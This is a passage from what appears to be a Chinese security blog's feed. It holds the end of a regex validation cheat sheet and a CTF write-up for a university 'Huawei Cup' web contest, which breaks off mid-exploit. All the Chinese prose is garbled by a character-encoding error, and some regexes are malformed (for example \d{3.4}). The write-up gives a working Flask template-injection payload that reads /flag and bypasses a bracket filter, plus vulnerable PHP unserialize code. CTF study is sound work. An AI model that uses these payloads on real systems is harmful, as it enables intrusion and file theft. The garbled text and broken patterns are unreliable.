æ˜¯æˆ–è€…æ„æ€ï¼Œè¡¨ç¤ºåŒ¹é…å·¦å³ä¸¤ä¸ªå­è¡¨è¾¾å¼å…¶ä¸­ä¸€ä¸ªéƒ½å¯ä»¥<span class="hljs-bullet">6. </span>éé›¶å¼€å¤´çš„æœ€å¤šå¸¦ä¸¤ä½å°æ•°çš„æ•°å­—ï¼š^([<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)+(.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)?$    // +åŒ¹é…å‰é¢çš„è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ (.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)? è¡¨ç¤ºåŒ¹é…  (.[<span class="hljs-string">0-9</span>]&#123;1,2&#125;)ä¸€æ¬¡æˆ–é›¶æ¬¡è¿™å­è¡¨è¾¾å¼ä»£è¡¨çš„æ˜¯0.[<span class="hljs-string">1-9</span>]æˆ–è€…0.[<span class="hljs-string">0-9</span>][<span class="hljs-symbol">1-9</span>]<span class="hljs-bullet">7. </span>å¸¦1-2ä½å°æ•°çš„æ­£æ•°æˆ–è´Ÿæ•°ï¼š^(\-)?\d+(\.\d&#123;1,2&#125;)?$     // (\-)? åŒ¹é…ä¸€æ¬¡æˆ–é›¶æ¬¡è´Ÿå· <span class="hljs-bullet">8. </span>æ­£æ•°ã€è´Ÿæ•°ã€å’Œå°æ•°ï¼š^(\-|\+)?\d+(\.\d+)?$     // \- \+ \.æ˜¯å°†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰<span class="hljs-bullet">9. </span>æœ‰ä¸¤ä½å°æ•°çš„æ­£å®æ•°ï¼š^[0-9]+(.[0-9]&#123;2&#125;)?$    <span class="hljs-bullet">10. </span>æœ‰1~3ä½å°æ•°çš„æ­£å®æ•°ï¼š^[0-9]+(.[0-9]&#123;1,3&#125;)?$<span class="hljs-bullet">11. </span>éé›¶çš„æ­£æ•´æ•°ï¼š^[<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*$ æˆ– ^([1-9][0-9]*</span>)&#123;1,3&#125;$ æˆ– ^\+?[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*$   // [1-9] æ§åˆ¶éé›¶<span class="hljs-bullet">12. </span>éé›¶çš„è´Ÿæ•´æ•°ï¼š^\-[<span class="hljs-string">1-9</span>][<span class="hljs-symbol"></span>]0-9"<span class="hljs-emphasis">*$ æˆ– ^-[1-9]\d*</span>$  //ä¸€ä¸‹çš„è¡¨è¾¾å¼çš„å«ä¹‰å¯ä»¥ä»¥æ­¤ç±»æ¨ï¼ˆæ„Ÿè§‰ä¸æ˜¯å¾ˆå¸¸ç”¨ï¼‰<span class="hljs-bullet">13. </span>éè´Ÿæ•´æ•°ï¼š^\d+$ æˆ– ^[1-9]\d*|0$<span class="hljs-bullet">14. </span>éæ­£æ•´æ•°ï¼š^-[1-9]\d*|0$ æˆ– ^((-\d+)|(0+))$<span class="hljs-bullet">15. </span>éè´Ÿæµ®ç‚¹æ•°ï¼š^\d+(\.\d+)?$ æˆ– ^[1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>|0?\.0+|0$<span class="hljs-bullet">16. </span>éæ­£æµ®ç‚¹æ•°ï¼š^((-\d+(\.\d+)?)|(0+(\.0+)?))$ æˆ– ^(-([1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>))|0?\.0+|0$<span class="hljs-bullet">17. </span>æ­£æµ®ç‚¹æ•°ï¼š^[<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>$ æˆ– ^(([<span class="hljs-string">0-9</span>]+\.[<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>\.[<span class="hljs-string">0-9</span>]+)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>))$<span class="hljs-bullet">18. </span>è´Ÿæµ®ç‚¹æ•°ï¼š^-([<span class="hljs-string">1-9</span>]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>)$ æˆ– ^(-(([<span class="hljs-string">0-9</span>]+\.[<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>\.[<span class="hljs-string">0-9</span>]+)|([<span class="hljs-string">0-9</span>]<span class="hljs-emphasis">*[1-9][0-9]*</span>)))$<span class="hljs-bullet">19. </span>æµ®ç‚¹æ•°ï¼š^(-?\d+)(\.\d+)?$ æˆ– ^-?([1-9]\d<span class="hljs-emphasis">*\.\d*</span>|0\.\d<span class="hljs-emphasis">*[1-9]\d*</span>|0?\.0+|0)$</code></pre></div><div class="hljs"><pre><code class="hljs angelscript">äºŒã€æ ¡éªŒå­—ç¬¦çš„è¡¨è¾¾å¼<span class="hljs-number">1.</span> æ±‰å­—ï¼š^[\u4e00-\u9fa5]&#123;<span class="hljs-number">0</span>,&#125;$   <span class="hljs-comment">//u4e00æ˜¯unicodeä¸­ç¬¬ä¸€ä¸ªæ±‰å­—ç¼–ç  u9fa5æ˜¯æœ€åä¸€ä¸ª</span><span class="hljs-number">2.</span> è‹±æ–‡å’Œæ•°å­—ï¼š^[A-Za-z0<span class="hljs-number">-9</span>]+$ æˆ– ^[A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">4</span>,<span class="hljs-number">40</span>&#125;$  <span class="hljs-comment">//[A-Za-z0-9]å¯ä»¥åŒ¹é…å¤§å°å†™å­—æ¯æ•°å­— </span><span class="hljs-number">3.</span> é•¿åº¦ä¸º<span class="hljs-number">3</span><span class="hljs-number">-20</span>çš„æ‰€æœ‰å­—ç¬¦ï¼š^.&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;$  <span class="hljs-comment">// .ä»£è¡¨ä»»æ„å­—ç¬¦åŒ…æ‹¬æ¢è¡Œç¬¦</span><span class="hljs-number">4.</span> ç”±<span class="hljs-number">26</span>ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Za-z]+$<span class="hljs-number">5.</span> ç”±<span class="hljs-number">26</span>ä¸ªå¤§å†™è‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Z]+$<span class="hljs-number">6.</span> ç”±<span class="hljs-number">26</span>ä¸ªå°å†™è‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[a-z]+$<span class="hljs-number">7.</span> ç”±æ•°å­—å’Œ<span class="hljs-number">26</span>ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Za-z0<span class="hljs-number">-9</span>]+$ <span class="hljs-comment">//ä¸ç¬¬äºŒä¸ªè¡¨è¾¾å¼ç›¸åŒ</span><span class="hljs-number">8.</span> ç”±æ•°å­—ã€<span class="hljs-number">26</span>ä¸ªè‹±æ–‡å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^\w+$ æˆ– ^\w&#123;<span class="hljs-number">3</span>,<span class="hljs-number">20</span>&#125;$   <span class="hljs-comment">//  \w=[0-9A-Za-z_]</span><span class="hljs-number">9.</span> ä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—åŒ…æ‹¬ä¸‹åˆ’çº¿ï¼š^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>_]+$ <span class="hljs-number">10.</span> ä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—ä½†ä¸åŒ…æ‹¬ä¸‹åˆ’çº¿ç­‰ç¬¦å·ï¼š^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]+$ æˆ– ^[\u4E00-\u9FA5A-Za-z0<span class="hljs-number">-9</span>]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">20</span>&#125;$ <span class="hljs-number">11.</span> å¯ä»¥è¾“å…¥å«æœ‰^%&amp;<span class="hljs-string">',;=?$\"ç­‰å­—ç¬¦ï¼š[^%&amp;'</span>,;=?$\x22]+ <span class="hljs-number">12</span> ç¦æ­¢è¾“å…¥å«æœ‰~çš„å­—ç¬¦ï¼š[^~\x22]+  <span class="hljs-comment">//è¿™é‡Œçš„ ^æ˜¯éçš„æ„æ€</span></code></pre></div><p>ä¸‹é¢è¿™äº›å°±ä¸ä¸€ä¸€è§£é‡Šäº†ï¼Œå®åœ¨å¤ªå¤šäº†æœ‰çš„è¿˜æ˜¯é‡å¤ã€‚</p><div class="hljs"><pre><code class="hljs markdown">ä¸‰ã€ç‰¹æ®Šéœ€æ±‚è¡¨è¾¾å¼<span class="hljs-bullet">1. </span>Emailåœ°å€ï¼š^\w+([-+.]\w+)<span class="hljs-emphasis">*@\w+([-.]\w+)*</span>\.\w+([-.]\w+)*$<span class="hljs-bullet">2. </span>åŸŸåï¼š[<span class="hljs-string">a-zA-Z0-9</span>][<span class="hljs-symbol">-a-zA-Z0-9</span>]&#123;0,62&#125;(/.[<span class="hljs-string">a-zA-Z0-9</span>][<span class="hljs-symbol">-a-zA-Z0-9</span>]&#123;0,62&#125;)+/.?<span class="hljs-bullet">3. </span>InternetURLï¼š[a-zA-z]+://[^\s]<span class="hljs-emphasis">* æˆ– ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*</span>)?$<span class="hljs-bullet">4. </span>æ‰‹æœºå·ç ï¼š^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d&#123;8&#125;$<span class="hljs-bullet">5. </span>ç”µè¯å·ç ("XXX-XXXXXXX"ã€"XXXX-XXXXXXXX"ã€"XXX-XXXXXXX"ã€"XXX-XXXXXXXX"ã€"XXXXXXX"å’Œ"XXXXXXXX)ï¼š^(\(\d&#123;3,4&#125;-)|\d&#123;3.4&#125;-)?\d&#123;7,8&#125;$<span class="hljs-bullet">6. </span>å›½å†…ç”µè¯å·ç (0511-4405222ã€021-87888822)ï¼š\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;<span class="hljs-bullet">7. </span>èº«ä»½è¯å·(15ä½ã€18ä½æ•°å­—)ï¼š^\d&#123;15&#125;|\d&#123;18&#125;$<span class="hljs-bullet">8. </span>çŸ­èº«ä»½è¯å·ç (æ•°å­—ã€å­—æ¯xç»“å°¾)ï¼š^([0-9])&#123;7,18&#125;(x|X)?$ æˆ– ^\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$<span class="hljs-bullet">9. </span>å¸å·æ˜¯å¦åˆæ³•(å­—æ¯å¼€å¤´ï¼Œå…è®¸5-16å­—èŠ‚ï¼Œå…è®¸å­—æ¯æ•°å­—ä¸‹åˆ’çº¿)ï¼š^[<span class="hljs-string">a-zA-Z</span>][<span class="hljs-symbol">a-zA-Z0-9_</span>]&#123;4,15&#125;$<span class="hljs-bullet">10. </span>å¯†ç (ä»¥å­—æ¯å¼€å¤´ï¼Œé•¿åº¦åœ¨6~18ä¹‹é—´ï¼Œåªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿)ï¼š^[a-zA-Z]\w&#123;5,17&#125;$<span class="hljs-bullet">11. </span>å¼ºå¯†ç (å¿…é¡»åŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—çš„ç»„åˆï¼Œä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ï¼Œé•¿åº¦åœ¨8-10ä¹‹é—´)ï¼š^(?=.<span class="hljs-emphasis">*\d)(?=.*</span>[a-z])(?=.*[A-Z]).&#123;8,10&#125;$<span class="hljs-bullet">12. </span>æ—¥æœŸæ ¼å¼ï¼š^\d&#123;4&#125;-\d&#123;1,2&#125;-\d&#123;1,2&#125;<span class="hljs-bullet">13. </span>ä¸€å¹´çš„12ä¸ªæœˆ(01ï½09å’Œ1ï½12)ï¼š^(0?[1-9]|1[0-2])$<span class="hljs-bullet">14. </span>ä¸€ä¸ªæœˆçš„31å¤©(01ï½09å’Œ1ï½31)ï¼š^((0?[1-9])|((1|2)[0-9])|30|31)$14 é’±çš„è¾“å…¥æ ¼å¼ï¼š15    1.æœ‰å››ç§é’±çš„è¡¨ç¤ºå½¢å¼æˆ‘ä»¬å¯ä»¥æ¥å—:"10000.00" å’Œ "10,000.00", å’Œæ²¡æœ‰ "åˆ†" çš„ "10000" å’Œ "10,000"ï¼š^[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*$ 16    2.è¿™è¡¨ç¤ºä»»æ„ä¸€ä¸ªä¸ä»¥0å¼€å¤´çš„æ•°å­—,ä½†æ˜¯,è¿™ä¹Ÿæ„å‘³ç€ä¸€ä¸ªå­—ç¬¦"0"ä¸é€šè¿‡,æ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨ä¸‹é¢çš„å½¢å¼ï¼š^(0|[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$ 17    3.ä¸€ä¸ª0æˆ–è€…ä¸€ä¸ªä¸ä»¥0å¼€å¤´çš„æ•°å­—.æˆ‘ä»¬è¿˜å¯ä»¥å…è®¸å¼€å¤´æœ‰ä¸€ä¸ªè´Ÿå·ï¼š^(0|-?[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]*)$ 18    4.è¿™è¡¨ç¤ºä¸€ä¸ª0æˆ–è€…ä¸€ä¸ªå¯èƒ½ä¸ºè´Ÿçš„å¼€å¤´ä¸ä¸º0çš„æ•°å­—.è®©ç”¨æˆ·ä»¥0å¼€å¤´å¥½äº†.æŠŠè´Ÿå·çš„ä¹Ÿå»æ‰,å› ä¸ºé’±æ€»ä¸èƒ½æ˜¯è´Ÿçš„å§.ä¸‹é¢æˆ‘ä»¬è¦åŠ çš„æ˜¯è¯´æ˜å¯èƒ½çš„å°æ•°éƒ¨åˆ†ï¼š^[0-9]+(.[0-9]+)?$ 19    5.å¿…é¡»è¯´æ˜çš„æ˜¯,å°æ•°ç‚¹åé¢è‡³å°‘åº”è¯¥æœ‰1ä½æ•°,æ‰€ä»¥"10."æ˜¯ä¸é€šè¿‡çš„,ä½†æ˜¯ "10" å’Œ "10.2" æ˜¯é€šè¿‡çš„ï¼š^[0-9]+(.[0-9]&#123;2&#125;)?$ 20    6.è¿™æ ·æˆ‘ä»¬è§„å®šå°æ•°ç‚¹åé¢å¿…é¡»æœ‰ä¸¤ä½,å¦‚æœä½ è®¤ä¸ºå¤ªè‹›åˆ»äº†,å¯ä»¥è¿™æ ·ï¼š^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 21    7.è¿™æ ·å°±å…è®¸ç”¨æˆ·åªå†™ä¸€ä½å°æ•°.ä¸‹é¢æˆ‘ä»¬è¯¥è€ƒè™‘æ•°å­—ä¸­çš„é€—å·äº†,æˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼š^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 22    8.1åˆ°3ä¸ªæ•°å­—,åé¢è·Ÿç€ä»»æ„ä¸ª é€—å·+3ä¸ªæ•°å­—,é€—å·æˆä¸ºå¯é€‰,è€Œä¸æ˜¯å¿…é¡»ï¼š^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 23    å¤‡æ³¨ï¼šè¿™å°±æ˜¯æœ€ç»ˆç»“æœäº†,åˆ«å¿˜äº†"+"å¯ä»¥ç”¨"*"æ›¿ä»£å¦‚æœä½ è§‰å¾—ç©ºå­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ¥å—çš„è¯(å¥‡æ€ª,ä¸ºä»€ä¹ˆ?)æœ€å,åˆ«å¿˜äº†åœ¨ç”¨å‡½æ•°æ—¶å»æ‰å»æ‰é‚£ä¸ªåæ–œæ ,ä¸€èˆ¬çš„é”™è¯¯éƒ½åœ¨è¿™é‡Œ24 xmlæ–‡ä»¶ï¼š^([<span class="hljs-string">a-zA-Z</span>]+-?)+[<span class="hljs-string">a-zA-Z0-9</span>]+\\.[<span class="hljs-string">x|X</span>][<span class="hljs-symbol">m|M</span>][<span class="hljs-string">l|L</span>]$25 ä¸­æ–‡å­—ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š[\u4e00-\u9fa5]26 åŒå­—èŠ‚å­—ç¬¦ï¼š[^\x00-\xff]    (åŒ…æ‹¬æ±‰å­—åœ¨å†…ï¼Œå¯ä»¥ç”¨æ¥è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦(ä¸€ä¸ªåŒå­—èŠ‚å­—ç¬¦é•¿åº¦è®¡2ï¼ŒASCIIå­—ç¬¦è®¡1))27 ç©ºç™½è¡Œçš„æ­£åˆ™è¡¨è¾¾å¼ï¼š\n\s*\r    (å¯ä»¥ç”¨æ¥åˆ é™¤ç©ºç™½è¡Œ)28 HTMLæ ‡è®°çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">(\S*?)[^</span>&gt;</span></span>]<span class="hljs-emphasis">*&gt;.*</span>?<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">\1</span>&gt;</span></span>|<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">.*?</span> /&gt;</span></span>    (ç½‘ä¸Šæµä¼ çš„ç‰ˆæœ¬å¤ªç³Ÿç³•ï¼Œä¸Šé¢è¿™ä¸ªä¹Ÿä»…ä»…èƒ½éƒ¨åˆ†ï¼Œå¯¹äºå¤æ‚çš„åµŒå¥—æ ‡è®°ä¾æ—§æ— èƒ½ä¸ºåŠ›)29 é¦–å°¾ç©ºç™½å­—ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š^\s<span class="hljs-emphasis">*|\s*</span>$æˆ–(^\s<span class="hljs-emphasis">*)|(\s*</span>$)    (å¯ä»¥ç”¨æ¥åˆ é™¤è¡Œé¦–è¡Œå°¾çš„ç©ºç™½å­—ç¬¦(åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰)ï¼Œéå¸¸æœ‰ç”¨çš„è¡¨è¾¾å¼)30 è…¾è®¯QQå·ï¼š[<span class="hljs-string">1-9</span>][<span class="hljs-symbol">0-9</span>]&#123;4,&#125;    (è…¾è®¯QQå·ä»10000å¼€å§‹)31 ä¸­å›½é‚®æ”¿ç¼–ç ï¼š[1-9]\d&#123;5&#125;(?!\d)    (ä¸­å›½é‚®æ”¿ç¼–ç ä¸º6ä½æ•°å­—)32 IPåœ°å€ï¼š\d+\.\d+\.\d+\.\d+    (æå–IPåœ°å€æ—¶æœ‰ç”¨)33 IPåœ°å€ï¼š((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)) 34 å°†urlçš„åè®®ï¼Œä¸»æœºåï¼Œç«¯å£å·ï¼Œæ–‡ä»¶è·¯å¾„æ”¾åˆ°æ•°ç»„ä¸­:var str = "http://www.runoob.com:80/html/html-tutorial.html";var patt1 = /(\w+):\/\/([^/:]+)(:\d<span class="hljs-emphasis">*)?([^# ]*</span>)/;   //å››ä¸ªå­è¡¨è¾¾å¼ç»„åˆåœ¨ä¸€èµ·ï¼Œ(\w+): åŒ¹é…å­—ç¬¦ä¸²å¼€å§‹åˆ°: ([^/:]+) åŒ¹é…é/ é:åçš„å†…å®¹  (:\d<span class="hljs-emphasis">*)? åŒ¹é…:åçš„è‹¥å¹²æ•°å­—ä¸”è¡¨è¾¾å¼é‡å¤ä¸€æ¬¡æˆ–å¤šæ¬¡  ([^# ]*</span>) åŒ¹é…ä¸åŒ…æ‹¬#æˆ–ç©ºæ ¼å­—ç¬¦çš„ä»»ä½•å­—ç¬¦åºåˆ—</code></pre></div><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ­£åˆ™è¡¨è¾¾å¼çš„åŠŸèƒ½è¿˜æ˜¯å¾ˆå¼ºå¤§çš„ï¼Œæƒ³è¦å†™å‡ºèƒ½å‡†ç¡®åŒ¹é…ç›®æ ‡çš„è¡¨è¾¾å¼è¿˜æ˜¯éœ€è¦è®¤çœŸå­¦ä¹ çš„ï¼Œä½†æ˜¯ä»£ç å®¡è®¡ä¸­çš„è¦æ±‚æ²¡é‚£ä¹ˆä¸¥æ ¼ï¼Œåªéœ€è¦èƒ½çœ‹æ‡‚è¡¨è¾¾å¼åŒ¹é…äº†å“ªäº›å†…å®¹å³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cumtåä¸ºæ¯</title>
    <link href="/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/"/>
    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="cumt-åä¸ºæ¯"><a href="#cumt-åä¸ºæ¯" class="headerlink" title="cumt_åä¸ºæ¯"></a>cumt_åä¸ºæ¯</h1><p>ç»å…¸çš„å­¦é•¿è™èœå±€ï¼Œwebåªåšå‡ºæ¥ä¸€ä¸ªï¼Œå¦å¤–ä¸¤é¢˜å¥½ä¸å®¹æ˜“æœ‰æ€è·¯äº†ï¼Œéƒ½è¢«å¡æ­»äº†</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>çœŸç­¾åˆ°é¢˜ï¼ŒæŠ½ä¸ªå¥–å°±ç»™å‡ºäº†flag</p><h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>åˆšè¿›å…¥é¡µé¢ï¼Œåªæœ‰ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆ</p><p>å°±æ˜¯äº†æ¨¡æ¿æ³¨å…¥</p><div class="hljs"><pre><code class="hljs angelscript">url+&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;Copy</code></pre></div><p>é¡µé¢å‡ºç°404æŠ¥é”™ï¼Œå¹¶ä¸”æ˜¾ç¤ºçš„æ˜¯url+49ï¼Œç¡®å®šæ˜¯æ¨¡æ¿æ³¨å…¥</p><div class="hljs"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;æŸ¥çœ‹æ¨¡å—æ—¶ï¼Œå‘ç°å­˜åœ¨wafç»è¿‡æµ‹è¯•å‘ç°æ˜¯è¿‡æ»¤äº†[]äºæ˜¯ä½¿ç”¨&#123;&#123;<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;å­˜åœ¨fileæ¨¡å—ç”¨readè¯»å–æ–‡ä»¶å†…å®¹<span class="hljs-built_in">exp</span>:<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">'/flag'</span>).read()Copy</code></pre></div><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/8029" target="_blank" rel="noopener">https://xz.aliyun.com/t/8029</a></p><h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>è¿™é¢˜æ˜¯çœŸæ»´æ— è¯­ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯XSSï¼Œåæ¥å­¦é•¿æç¤ºä¸æ˜¯ï¼Œåˆæ‰¾åˆ°äº†æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Œç›´æ¥æ‹¿åˆ°äº†ç½‘ç«™æ ¹ç›®å½•æœ¬ä»¥ä¸ºåšå‡ºäº†ï¼Œç»“æœæç¤ºflag not here,å¿ƒæ€ç‚¸è£‚ï¼Œä½†æ˜¯æç¤ºäº†â€æŠ•ä¸ªç¨¿ï¼Ÿâ€œï¼Œåº”è¯¥æ˜¯åœ¨æŠ•ç¨¿ä½ç½®ä¸‹åŠŸå¤«å§ã€‚åˆ°æœ€åä¹Ÿæ²¡åšå‡ºäº†ï¼Œä½†æ˜¯æ‰¾åˆ°äº†æ¼æ´ä»£ç ï¼Œåº”è¯¥æ˜¯sqlæ³¨å…¥ã€‚</p><p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" srcset="/img/loading.gif" alt="cms.png"></a></p><p>è¿™é‡Œç»™å‡ºå¤§ç¥çš„åšæ³•</p><p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" srcset="/img/loading.gif" alt="cms1.png"></a></p><h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>è¿™é¢˜åŸºæœ¬ä¸Šæ˜¯åŸé¢˜ï¼Œä½†æ˜¯åŠ äº†ä¸€å±‚è¿‡æ»¤ï¼Œæ€ä¹ˆéƒ½æ²¡ç»•è¿‡å»ã€‚ã€‚ã€‚</p><p>çœ‹åˆ°WPæ˜¯å¤§Sç»•è¿‡ï¼Œæ¶¨çŸ¥è¯†äº†</p><div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>&#123;</span><span class="php">        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">'license.txt'</span>, <span class="hljs-keyword">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-keyword">true</span>);</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span><span class="hljs-params">($str)</span> </span>&#123;</span><span class="php">    <span class="hljs-comment">//echo $str;</span></span><span class="php">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $str, $matches)) &#123;</span><span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>]))&#123;</span><span class="php">    $s = <span class="hljs-keyword">new</span> Source();</span><span class="php">    $s-&gt;source = <span class="hljs-keyword">__FILE__</span>;</span><span class="php">    <span class="hljs-keyword">echo</span> $s;</span><span class="php">    <span class="hljs-keyword">exit</span>;</span><span class="php">&#125;</span><span class="php">$todos = [];</span><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'todos'</span>]))&#123;</span><span class="php">    <span class="hljs-keyword">if</span>(!easy_check($_COOKIE[<span class="hljs-string">'todos'</span>])) &#123;</span><span class="php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!\n"</span>;</span><span class="php">    &#125; <span class="hljs-keyword">else</span> &#123;</span><span class="php">        $c = $_COOKIE[<span class="hljs-string">'todos'</span>];</span><span class="php">        $h = substr($c, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);</span><span class="php">        $m = substr($c, <span class="hljs-number">32</span>);</span><span class="php">        <span class="hljs-keyword">if</span>(md5($m) === $h)&#123;</span><span class="php">            $todos = unserialize($m);</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'text'</span>]))&#123;</span><span class="php">    $todo = $_POST[<span class="hljs-string">'text'</span>];</span><span class="php">    $todos[] = $todo;</span><span class="php">    $m = serialize($todos);</span><span class="php">    $h = md5($m);</span><span class="php">    setcookie(<span class="hljs-string">'todos'</span>, $h.$m);</span><span class="php">    header(<span class="hljs-string">'Location: '</span>.$_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]);</span><span class="php">    <span class="hljs-keyword">exit</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-comment">// flag is in flag.php</span></span><span class="php">?Copy</span></code></pre></div><p>exp</p><div class="hljs"><pre><code class="hljs less"><span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">md5</span>('<span 